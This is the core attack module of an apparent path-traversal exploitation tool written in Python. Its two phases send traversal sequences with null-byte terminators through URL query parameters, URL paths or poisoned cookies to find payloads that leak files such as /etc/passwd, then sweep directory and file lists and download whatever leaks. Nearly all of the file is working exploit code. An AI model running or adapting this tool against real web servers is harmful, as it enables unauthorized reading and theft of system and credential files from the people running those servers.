#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

from core.methods.session import session
import requests
from core.colors import color
from core.variables import payloadlist, nullchars
from core.methods.filecheck import filecheck
from core.methods.loot import download
from core.methods.print import progress


"""prepare request for inpath attack"""
def inpath(traverse, dir, file, nb, url, url2):
    path=traverse+dir+file+nb+url2
    p = traverse+dir+file+nb
    req = requests.Request(method='GET', url=url)
    prep = req.prepare()
    prep.url = url + path
    return (prep, p)

"""prepare request for query attack"""
def query(traverse, dir, file, nb, keyword, url, url2):
    query = "?" + keyword + "=" + traverse + dir + file + nb + url2
    p = traverse + dir + file + nb
    req = requests.Request(method='GET', url=url)
    prep = req.prepare()
    prep.url = url + query
    return (prep, p)

"""
[Phase 1]: Vulnerability Analysis

@attack: attack mode (-a ACK)
@url: target part 1 (-v VIC)
@url2: target part 2 (-q VIC2)
@keyword: -p PAM (only for -a 1)
@cookie: cookiejar for -a 3
@selected: selected cookie to be poisoned
@verbose: print 404s?
@depth: attack depth (-d INT)
@paylist: payload list (all)
@file: file to be looked up (-i FIL, default: /etc/passwd)
"""
def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file):
    #resolve issues with inpath attac
    requestcount = 0
    totalrequests = len(paylist) * (len(nullchars) + 1) * depth
    if not url.endswith("/"):
        url += "/"
    payloads = []
    nullbytes = []
    s = session()
    if attack == 3:
        s.cookies = cookie
    #initial ping for filecheck
    con2 = requests.get(url).content
    for i in paylist:
        d = 0
        while d <= depth:
            traverse=''
            j=1
            while j <= d:
                traverse+=i
                j+=1
            requestlist = []
            if attack == 1:
                prep, p = query(traverse, "", file, "", keyword, url, url2)
                r = s.send(prep)
            elif attack == 2:
                prep, p = inpath(traverse, "", file, "", url, url2)
                r = s.send(prep)
            else:
                s.cookies.set(selected, traverse + file)
                p = traverse + file
                r = s.get(url)
            requestlist.append((r, p, ""))
            for nb in nullchars:
                if attack == 1:
                    prep, p = query(traverse, "", file, nb, keyword, url, url2)
                    r = s.send(prep)
                elif attack == 2:
                    prep, p = inpath(traverse, "", file, nb, url, url2)
                    r = s.send(prep)
                else:
                    s.cookies.set(selected, traverse + file + nb)
                    p = traverse + file + nb
                    r = s.get(url)
                requestlist.append((r, p, nb))
            found = False
            for (r, p, nb) in requestlist:
                requestcount += 1
                progress(requestcount, totalrequests, prefix=" ", suffix=" ")
                if str(r.status_code).startswith("2") or r.status_code == 302 or (r.status_code == 403 and attack != 2):
                    if filecheck(r, con2, p):
                        payloads.append(i)
                        if nb != "":
                            nullbytes.append(nb)
                        found = True
                        print(color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " " + i)
            d+=1
            if found:
                break
    
    return (payloads, nullbytes)

"""
[Phase 2]: Exploitation

@attack: attack mode (-a ACK)
@url: target part 1 (-v VIC)
@url2: target part 2 (-q VIC2)
@keyword: -p PAM (only for -a 1)
@cookie: cookiejar for -a 3
@selected: selected cookie to be poisoned
@files: file list created from -l FIL ...
@dirs: directory list (permutation level based on -d INT)
@depth: attack depth (-d INT)
@verbose: print 404s?
@dl: download found files?
@selected_payloads: payloads selected in phase 1
@selected_nullbytes: terminators selected in phase 1
"""
def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, verbose, dl, selected_payloads, selected_nullbytes):
    #resolve issues with inpath attack and loot function
    requestcount = 0
    if len(selected_nullbytes) == 0:
        totalrequests = len(selected_payloads) * len(files) * len(dirs) * depth
    else:
        totalrequests = len(selected_payloads) * len(selected_nullbytes) * len(files) * len(dirs) * depth
    if not url.endswith("/"):
        url += "/"
    found=[]
    urls = []
    s = session()
    #initial ping for filecheck
    con2 = requests.get(url).content
    for dir in dirs:
        for file in files:
            d=1
            while d <= depth:
                for i in selected_payloads:
                    traverse=''
                    j=1
                    while j <= d:
                        traverse+=i
                        j+=1
                    requestlist = []
                    if selected_nullbytes == []:
                        if attack == 1:
                            prep, p = query(traverse, dir, file, "", keyword, url, url2)
                            r = s.send(prep)
                        elif attack == 2:
                            prep, p = inpath(traverse, dir, file, "", url, url2)
                            r = s.send(prep)
                        else:
                            p = traverse + dir + file
                            s.cookies.set(selected, traverse + dir + file)
                            r = s.get(url)
                        requestlist.append((r,p))
                    else:
                        for nb in selected_nullbytes:
                            if attack == 1:
                                prep, p = query(traverse, dir, file, nb, keyword, url, url2)
                                r = s.send(prep)
                            elif attack == 2:
                                prep, p = inpath(traverse, dir, file, nb, url, url2)
                                r = s.send(prep)
                            else:
                                p = traverse + dir + file + nb
                                s.cookies.set(selected, traverse + dir + file + nb)
                                r = s.get(url)
                            requestlist.append((r,p))
                    for (r,p) in requestlist:
                        requestcount += 1
                        progress(requestcount, totalrequests, prefix=" ", suffix=" ")
                        if attack == 3:
                            s.cookies.set(selected, p)
                        if str(r.status_code).startswith("2") or r.status_code == 302:
                            if filecheck(r, con2, p):
                                if attack != 3:
                                    print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                    if dl and dir+file not in found:
                                        download(r.url,dir+file)
                                    found.append(dir+file)
                                    if attack == 1:
                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                                    else:
                                        vlnlist = r.url.split("/")[1::]
                                        vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
                                else:
                                    print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
                                    if dl and dir+file not in found:
                                        download(r.url,dir+file,cookie=s.cookies)
                                    found.append(dir+file)
                                    urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                        elif r.status_code == 403 and attack != 2:
                            if attack != 3:
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                found.append(dir+file)
                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                            else:
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
                                found.append(dir+file)
                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                        else:
                            if verbose:
                                print(color.RD+"{}|: ".format(r.status_code)+color.END+color.RC+r.url+color.END)
                d+=1
    return (found, urls)